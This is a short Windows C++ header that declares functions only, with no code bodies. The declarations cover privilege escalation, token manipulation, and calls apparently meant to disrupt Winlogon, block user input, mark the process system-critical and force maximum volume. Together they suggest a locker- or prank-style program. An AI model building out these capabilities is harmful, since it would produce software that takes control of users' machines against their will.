#pragma once
#include <Windows.h>

void AdjustPrivilege(LPCTSTR privilege, BOOL enabled);

DWORD GetWinlogonPID();

BOOL IsAdmin();
void RelaunchAsAdmin();

BOOL HasUIAccess();
HANDLE CreateUIAccessToken();
void RelaunchWithUIAccess();

BOOL IsInteractive();
HANDLE CreateInteractiveToken();
void RestartInteractively();

void BreakWinlogon();

void BlockInput();

void MakeSystemCritical();

void LockMaxVolume();